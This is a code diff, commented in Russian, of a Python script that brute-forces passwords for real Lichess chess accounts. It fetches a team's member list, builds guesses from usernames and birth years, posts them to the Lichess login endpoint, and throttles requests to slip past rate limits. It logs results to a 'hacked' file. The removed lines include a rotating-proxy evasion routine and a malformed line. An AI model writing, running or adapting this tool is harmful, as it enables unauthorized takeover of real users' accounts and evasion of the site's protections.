@@ -1,5 +1,5 @@
 # Для работы программы, необходимо установить модуль requests. Если у вас получилась ошибка, то у вас нету этого модуля.
-import requests, time, json, os, sys
+import requests, time, json, os, sys, ndjson
 from config import *
 
 # По желанию, чтобы можно было взламывать по дате или году рождения, указанном в профиле, можно загрузить у фиша еще одну программу под именем tracker.py
@@ -8,16 +8,6 @@ import tracker, r_e
 
 # Заходим через прокси
 def start(passwords):
-    def proxy(user, password):
-        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=elite")
-        proxy_list = r.text.split("\r\n")
-        for p in proxy_list:
-            proxies = {"http" : "http://" + p, "https" : "http://" + p}
-            try:
-              n = requests.post("https://lichess.org/login", data={"username" : user, "password" : password, "remember" : "true"}, headers={"X-Requested-With" : "XMLHttpRequest", "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"}, proxies=proxies, timeout=2)
-              return n
-            except: time.sleep(0.2)
-        return 0
 
     # Это функция получения цифр с логина
     def getNumericPart(string):
@@ -44,7 +34,8 @@ def start(passwords):
     # Получаем список людей для взлома
     # Это может занять некоторое время
     print(yellow + "[..] Получаем список, это может занять некоторое время...")
-    users = requests.get("https://lichess.org/api/team/"+team+"/users").text.split("\n")
+    r_m = requests.get('https://lichess.org/api/team/' + team + '/users')
+    users = r_m.json(cls=ndjson.Decoder)
 
     # Выводим сообщение, что список готов
     print(green + "[+] Список пользователей получен!")
@@ -56,48 +47,24 @@ def start(passwords):
     for user in users:
 
     #   Получаем ник участника
-        username = json.loads(user).get("username")
+        username = user["username"]
 
         if (len(username) < 4): continue
         if (not k): continue
     #   Здесь писать список паролей, которые будут перебиратся
     #   Самые популярные пароли: username (такой же как и логин), '123456', '123456789' и getNumericPart(username) (цифры с логина)
     #   Писать сразу больше двух паролей не рекомендуется
-    
-        # tracker bypass
-        tracker_info = tracker.get_name(username)
-        tracker.get_birthday(username)
-
-        s = username[len(username)-4] + username[len(username)-3] + username[len(username)-2] + username[len(username)-1]
-        if (not s.isnumeric()): continue
-        n = int(s)
-        if (n < 1940) or (n > 2017): continue
-        k = getNamePart(username)
-        #passwords = []
-        if (len(k) > 2): passwords.append(k + str(n))
-        if (len(getNumericPart(username)) == 8): passwords.append(getNumericPart(username))
-        if (len(usernam)) == 8): passwords.append(username) 
-
         for password in passwords:
-
-    #       Проверка пароля на правильность (личесс запрещает пароли меньше 4 символов)
-            if (not password): continue
-            if (len(password) < 4): continue
-            if (password == username): continue
-
-    #       Взламываем
-            r = proxy(username, password)
-    #        r = requests.post("https://lichess.org/login", data={"username" : user, "password" : password, "remember" : "true"}, headers={"X-Requested-With" : "XMLHttpRequest", "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
+            r = requests.post("https://lichess.org/login", data={"username" : username, "password" : password, "remember" : "true"}, headers={"X-Requested-With" : "XMLHttpRequest", "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
+    #
 
     #       Выводим статус взлома
     #       200 означает что аккаунт взломан, 401 что взломать не получилось, 429 что личесс блокирует ваши запросы
             print(r, username, password)
+            k += 1
 
-    #       Если взлом удался, то пишем аккаунт в файл, чтобы не потерять
-    #       Просьба сообщать обо всех взломанных аккаунтах
-            if (r == 200): open("hacked3_real", "a").write(username + " " + password + "\n")
+            with open("hacked_real.txt", "a") as h_list: h_list.write(f"{r}, {username}, {password}")
 
-    #       Ждем 5 секунд, иначе личесс не даст взламывать. Время можно увеличить.
             time.sleep(5)
             if k % 10 == 0:
                 time.sleep(20) # ждем потому что таймаут после каждого 10 подбора
@@ -105,7 +72,7 @@ def start(passwords):
 
 if __name__ == "__main__":
     with open("passwords.txt", "r") as passwords:
-        start(list(passwords.read()))
+        start(passwords.readlines())
     print(green + "[+] Готово.")
     input(magenta + "[?] Продолжить? ")
     os.system('cls')
